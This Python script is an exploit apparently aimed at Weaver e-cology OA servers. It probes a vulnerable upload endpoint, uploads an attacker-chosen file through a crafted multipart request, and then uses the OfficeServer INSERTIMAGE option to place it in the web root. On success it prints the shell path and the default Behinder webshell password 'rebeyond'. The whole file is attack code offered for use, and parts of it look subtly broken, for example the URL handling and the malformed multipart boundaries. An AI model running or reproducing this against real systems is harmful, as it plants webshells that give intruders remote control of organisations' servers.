
import requests
import re

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def exp_check(url:str):
    try:
        payload = "/workrelate/plan/util/uploaderOperate.jsp"
        url = url.split(":")
        url = url[0] + ":" + url[1] + ":" + url[2]  + "/"
        rsp = requests.get(url+payload,headers=headers,verify=False)
        if rsp.status_code == 200 and rsp.text == "":
            return 1
        elif  "404" in rsp.text:
            return 2
    except:
        return 3

def exp_upload(url,data,shellName):
    headers['Content-Type'] = "multipart/form-data; boundary=----WebKitFormBoundaryRduA5222nTmsqjI6"
    url = url[0] + ":" + url[1] + ":" + url[2]  + "/"
    path = "/workrelate/plan/util/uploaderOperate.jsp"
    payload = (
                "------WebKitFormBoundaryRduA5222nTmsqjI6\n"
                "Content-Disposition: form-data; name=\"Filedata\";\"filename=\"{0}\"\r\n"
                "{1}\r\n"
                "------WebKitFormBoundaryRduA5222nTmsqjI6"
                "Content-Disposition: form-data; name=\"secId\"\r\n"
                "1\r\n"
                "------WebKitFormBoundaryRduA5222nTmsqjI6\r\n"
                "Content-Disposition: form-data;name=\"plandetailid\"\r\n"
                "1\r\n"
                "------WebKitFormBoundaryRduA5222nTmsqjI6--"
            ).format(shellName,data)
    rsp = requests.post(url + path,data=payload,headers=headers,verify=False)
    tmp = re.search("fileid=.*'",rsp.text)
    temp = re.search("[0-9]+",tmp.group())
    pathTwo = "/OfficeServer"
    payloadTwo = ("------WebKitFormBoundaryRduA5222nTmsqjI6\r\n"
                "Content-Disposition: form-data; name=\"aaa\"\r\n"

                "{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'{}'}\r\n"
                "------WebKitFormBoundaryRduA5222nTmsqjI6--\r\n"
                ).format(temp.group())
    resp = requests.post(url+pathTwo,data=payloadTwo,headers=headers,verify=False)
    if  "ecology\\{}".format(shellName) in resp.text:
        return ("上传成功:\r\n"
                "路径如下：\r\n"
                "{0}/{1}      默认冰蝎码：rebeyond".format(url,shellName)
                )

    
    